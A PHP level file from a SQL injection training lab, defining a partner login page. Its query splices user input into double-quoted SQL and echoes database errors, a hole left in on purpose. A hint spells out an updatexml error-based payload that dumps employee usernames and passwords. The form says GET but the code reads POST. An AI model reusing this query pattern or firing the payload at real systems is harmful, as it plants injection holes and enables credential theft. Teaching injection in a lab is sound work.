<?php
// Less-14 合作伙伴登录
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '合作伙伴登录',
  'desc'  => '供应商与合作伙伴登录入口。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'uname' => '账号',
  'passwd' => '密码',
), 'submit' => '登 录'],
  'difficulty' => 2,
  'task' => '确认双引号闭合后用报错函数提数',
  'hints' => array (
  0 => '失败时的报错依然是突破口，先确定闭合字符。',
  1 => '双引号闭合、无数据回显 → updatexml / extractvalue。',
  2 => '示例：uname=1" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from oa_employee),0x7e),1)-- -&passwd=1',
),
  'run' => function ($app) {
    if (!isset($_POST['uname']) || !isset($_POST['passwd'])) return $app->info('请输入账号与密码。');
    $uname = $_POST['uname'];
    $passwd = $_POST['passwd'];
    $sql = "SELECT username, name FROM oa_employee WHERE username=\"{$uname}\" and password=\"{$passwd}\" LIMIT 0,1";
    $res = $app->q($sql);
    $row = $app->fetch($res);
    if ($row) {
    return $app->info('登录成功，正在跳转……');
    }
    return $app->note($app->error());
  },
];
